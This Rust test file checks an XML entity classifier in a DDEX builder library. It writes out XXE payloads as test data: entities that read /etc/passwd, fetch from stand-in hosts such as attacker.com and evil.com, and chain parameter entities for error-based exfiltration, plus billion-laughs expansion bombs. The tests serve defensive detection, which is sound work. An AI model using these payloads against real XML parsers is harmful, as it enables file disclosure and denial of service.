//! Comprehensive tests for the entity classification system
//!
//! This test file verifies that the entity classifier properly distinguishes
//! between legitimate DDEX entities and malicious attempts using all the XXE
//! payloads from our security test suite.

use ddex_builder::security::{
    create_entity, create_external_entity, create_parameter_entity, AttackType, ClassifierConfig,
    Entity, EntityClass, EntityClassifier,
};

#[test]
fn test_safe_builtin_entity_classification() {
    let mut classifier = EntityClassifier::new();

    // Test standard XML entities
    assert_eq!(
        classifier.classify_entity("lt", "<"),
        EntityClass::SafeBuiltin
    );

    assert_eq!(
        classifier.classify_entity("gt", ">"),
        EntityClass::SafeBuiltin
    );

    assert_eq!(
        classifier.classify_entity("amp", "&"),
        EntityClass::SafeBuiltin
    );

    assert_eq!(
        classifier.classify_entity("quot", "\""),
        EntityClass::SafeBuiltin
    );

    assert_eq!(
        classifier.classify_entity("apos", "'"),
        EntityClass::SafeBuiltin
    );
}

#[test]
fn test_safe_ddex_entity_classification() {
    let mut classifier = EntityClassifier::new();

    // Test DDEX-specific entities
    assert_eq!(
        classifier.classify_entity("ddex", "http://ddex.net/xml/ern/43"),
        EntityClass::SafeDdex
    );

    assert_eq!(
        classifier.classify_entity("ern", "43"),
        EntityClass::SafeDdex
    );

    assert_eq!(
        classifier.classify_entity("isrc", "USRC17607839"),
        EntityClass::SafeDdex
    );

    assert_eq!(
        classifier.classify_entity("Release", "R123"),
        EntityClass::SafeDdex
    );
}

#[test]
fn test_malicious_entity_detection() {
    let mut classifier = EntityClassifier::new();

    // Test XXE attack with SYSTEM reference
    let result = classifier.classify_entity("xxe", r#"SYSTEM "file:///etc/passwd""#);

    match result {
        EntityClass::Malicious {
            attack_type: AttackType::ExternalEntity,
            ..
        } => {}
        _ => panic!("Should detect external entity attack: {:?}", result),
    }

    // Test network URL attack
    let result = classifier.classify_entity("evil", "http://attacker.com/evil.xml");

    match result {
        EntityClass::Malicious {
            attack_type: AttackType::NetworkRequest,
            ..
        } => {}
        _ => panic!("Should detect network request attack: {:?}", result),
    }

    // Test malicious entity name
    let result = classifier.classify_entity("lol", "haha");

    match result {
        EntityClass::Malicious {
            attack_type: AttackType::EntityBomb,
            ..
        } => {}
        _ => panic!("Should detect malicious entity name: {:?}", result),
    }

    // Test billion laughs pattern
    let large_value = "A".repeat(10000);
    let result = classifier.classify_entity("billion", &large_value);

    match result {
        EntityClass::Malicious {
            attack_type: AttackType::EntityBomb,
            ..
        } => {}
        _ => panic!("Should detect billion laughs pattern: {:?}", result),
    }
}

#[test]
fn test_suspicious_entity_detection() {
    let mut classifier = EntityClassifier::new();

    // Test entity with many recursive references
    let result =
        classifier.classify_entity("recursive", "&ref1;&ref2;&ref3;&ref4;&ref5;&ref6;&ref7;");

    match result {
        EntityClass::Suspicious { reason, confidence } => {
            assert!(reason.contains("recursive references"));
            assert!(confidence > 0.0);
        }
        _ => panic!("Should detect suspicious recursive entity: {:?}", result),
    }

    // Test very large entity value
    let large_value = "A".repeat(20000);
    let result = classifier.classify_entity("large", &large_value);

    match result {
        EntityClass::Suspicious { reason, confidence } => {
            assert!(reason.contains("very large"));
            assert!(confidence > 0.0);
        }
        _ => panic!("Should detect suspicious large entity: {:?}", result),
    }
}

#[test]
fn test_entity_chain_validation_with_xxe_payloads() {
    let mut classifier = EntityClassifier::new();

    // Test basic XXE attack payload
    let xxe_entities = vec![create_external_entity("xxe", "file:///etc/passwd")];

    let result = classifier.validate_entity_chain(&xxe_entities);
    assert!(!result.is_safe);
    assert!(!result.errors.is_empty());
    assert!(result.errors.iter().any(|e| e.contains("not allowed")));

    // Test billion laughs attack payload
    let lol_entities = vec![
        create_entity("lol", "&lol2;&lol2;&lol2;&lol2;&lol2;"),
        create_entity("lol2", "&lol3;&lol3;&lol3;&lol3;&lol3;"),
        create_entity("lol3", "hahahaha"),
    ];

    let result = classifier.validate_entity_chain(&lol_entities);
    assert!(!result.is_safe);
    assert!(!result.errors.is_empty());

    // Test parameter entity attack
    let param_entities = vec![
        create_parameter_entity("file", "file:///etc/passwd"),
        create_parameter_entity(
            "eval",
            "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>",
        ),
    ];

    let result = classifier.validate_entity_chain(&param_entities);
    assert!(!result.is_safe);
    assert!(!result.errors.is_empty());

    // Test safe entity chain
    let safe_entities = vec![
        create_entity("title", "My Song"),
        create_entity("artist", "My Artist"),
        create_entity("label", "My Label"),
    ];

    let result = classifier.validate_entity_chain(&safe_entities);
    assert!(result.is_safe);
    assert!(result.errors.is_empty());
}

#[test]
fn test_expansion_ratio_detection() {
    let mut classifier = EntityClassifier::new();

    // Create entities that would cause expansion bomb
    let bomb_entities = vec![
        Entity {
            name: "bomb".to_string(),
            value: "A".repeat(1000), // 1KB content
            is_parameter: false,
            system_id: None,
            public_id: None,
            depth: 0,
            size: 1000,
        },
        Entity {
            name: "trigger".to_string(),
            value: "&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;".to_string(), // 10x reference
            is_parameter: false,
            system_id: None,
            public_id: None,
            depth: 1,
            size: 10000, // Would expand to 10KB
        },
    ];

    let result = classifier.validate_entity_chain(&bomb_entities);

    // Should detect high expansion ratio
    assert!(!result.is_safe || result.metrics.expansion_ratio > 5.0);

    if !result.is_safe {
        assert!(
            result
                .errors
                .iter()
                .any(|e| e.contains("expansion") || e.contains("ratio") || e.contains("large")),
            "Expected expansion-related error, got: {:?}",
            result.errors
        );
    }
}

#[test]
fn test_depth_tracking() {
    let mut classifier = EntityClassifier::new();

    // Create deeply nested entities
    let deep_entities = vec![
        Entity {
            name: "level1".to_string(),
            value: "&level2;".to_string(),
            is_parameter: false,
            system_id: None,
            public_id: None,
            depth: 0,
            size: 8,
        },
        Entity {
            name: "level2".to_string(),
            value: "&level3;".to_string(),
            is_parameter: false,
            system_id: None,
            public_id: None,
            depth: 1,
            size: 8,
        },
        Entity {
            name: "level3".to_string(),
            value: "&level4;".to_string(),
            is_parameter: false,
            system_id: None,
            public_id: None,
            depth: 2,
            size: 8,
        },
        Entity {
            name: "level4".to_string(),
            value: "&level5;".to_string(),
            is_parameter: false,
            system_id: None,
            public_id: None,
            depth: 3,
            size: 8,
        },
        Entity {
            name: "level5".to_string(),
            value: "deep".to_string(),
            is_parameter: false,
            system_id: None,
            public_id: None,
            depth: 4, // Too deep!
            size: 4,
        },
    ];

    let result = classifier.validate_entity_chain(&deep_entities);
    assert!(!result.is_safe);
    assert!(
        result.errors.iter().any(|e| e.contains("depth")),
        "Expected depth-related error, got: {:?}",
        result.errors
    );
    assert!(result.metrics.max_depth >= 4);
}

#[test]
fn test_security_config_integration() {
    // Test with restrictive config
    let mut restrictive_config = ClassifierConfig::default();
    restrictive_config.max_depth = 2;
    restrictive_config.max_expansion_ratio = 2.0;
    restrictive_config.allow_external_entities = false;
    restrictive_config.allow_parameter_entities = false;

    let mut classifier = EntityClassifier::with_config(restrictive_config);

    // This should be rejected due to depth
    let entities = vec![Entity {
        name: "deep".to_string(),
        value: "content".to_string(),
        is_parameter: false,
        system_id: None,
        public_id: None,
        depth: 3, // Exceeds max_depth of 2
        size: 7,
    }];

    let result = classifier.validate_entity_chain(&entities);
    assert!(!result.is_safe);
    assert!(result.errors.iter().any(|e| e.contains("depth")));
}

#[test]
fn test_known_attack_patterns() {
    let mut classifier = EntityClassifier::new();

    // Test all known XXE attack payloads from security tests
    let attack_payloads = vec![
        // Basic file disclosure
        ("xxe", r#"SYSTEM "file:///etc/passwd""#),
        // HTTP external entity
        ("xxe", r#"SYSTEM "http://attacker.com/evil.xml""#),
        // Billion laughs variants
        (
            "lol",
            "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;",
        ),
        (
            "lol2",
            "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;",
        ),
        ("lol9", "aaaaaaaaaa"),
        // Attack names
        ("bomb", "explosive content"),
        ("evil", "malicious payload"),
        ("attack", "attack vector"),
        ("exploit", "exploit code"),
        ("payload", "malicious payload"),
        // Network URLs
        ("net1", "https://evil.com/payload"),
        ("net2", "ftp://attacker.net/file"),
        ("net3", "file:///sensitive/data"),
        ("net4", r"\\evil-server\share\file"),
    ];

    for (name, value) in attack_payloads {
        let classification = classifier.classify_entity(name, value);

        match classification {
            EntityClass::Malicious { .. } => {
                // Expected for malicious entities
            }
            EntityClass::Suspicious { .. } => {
                // Also acceptable for borderline cases
            }
            _ => {
                panic!("Entity '{}' with value '{}' should be flagged as malicious or suspicious, got: {:?}", 
                       name, value, classification);
            }
        }
    }
}

#[test]
fn test_performance_and_metrics() {
    let mut classifier = EntityClassifier::new();

    // Create a moderately complex entity chain
    let entities = vec![
        create_entity("title", "Song Title"),
        create_entity("artist", "Artist Name"),
        create_entity("album", "Album Name"),
        create_entity("year", "2024"),
        create_entity("genre", "Rock"),
    ];

    let result = classifier.validate_entity_chain(&entities);

    // Should be safe
    assert!(result.is_safe);

    // Check metrics
    assert_eq!(result.metrics.entity_count, 5);
    assert!(result.metrics.processing_time_ms < 100); // Should be fast
    assert!(result.metrics.expansion_ratio > 0.0);
    assert_eq!(result.metrics.external_references, 0);
    assert_eq!(result.metrics.network_urls, 0);

    // Check metrics history
    let history = classifier.get_metrics_history();
    assert_eq!(history.len(), 1);
    assert_eq!(history[0].entity_count, 5);
}

#[test]
fn test_custom_safe_entities() {
    let mut config = ClassifierConfig::default();
    config.custom_safe_entities.insert("mycompany".to_string());
    config.custom_safe_entities.insert("custom".to_string());

    let mut classifier = EntityClassifier::with_config(config);

    // Should treat custom entities as safe DDEX entities
    assert_eq!(
        classifier.classify_entity("mycompany", "My Company Ltd"),
        EntityClass::SafeDdex
    );

    assert_eq!(
        classifier.classify_entity("custom", "Custom Value"),
        EntityClass::SafeDdex
    );

    // But other entities should still be classified normally
    match classifier.classify_entity("unknown", "Some Value") {
        EntityClass::CustomLocal => {}
        _ => panic!("Unknown entity should be CustomLocal"),
    }
}

#[test]
fn test_cache_performance() {
    let mut classifier = EntityClassifier::new();

    // First classification (should cache)
    let start = std::time::Instant::now();
    let result1 = classifier.classify_entity("test", "test value");
    let _first_duration = start.elapsed();

    // Second classification (should use cache)
    let start = std::time::Instant::now();
    let result2 = classifier.classify_entity("test", "test value");
    let second_duration = start.elapsed();

    // Results should be identical
    assert_eq!(result1, result2);

    // Second call should be faster (though this is not guaranteed)
    // Just verify it doesn't crash and returns consistent results
    assert!(second_duration < std::time::Duration::from_millis(100));
}

#[test]
fn test_repetitive_pattern_detection() {
    let mut classifier = EntityClassifier::new();

    // Create entity with repetitive pattern (potential expansion bomb indicator)
    let repetitive_value = "abcd".repeat(100); // 400 chars of repeated pattern
    let result = classifier.classify_entity("pattern", &repetitive_value);

    match result {
        EntityClass::Suspicious { reason, .. } => {
            assert!(reason.contains("repetitive"));
        }
        EntityClass::CustomLocal => {
            // Also acceptable - repetitive pattern detection is a heuristic
        }
        _ => panic!(
            "Should detect repetitive pattern as suspicious: {:?}",
            result
        ),
    }
}
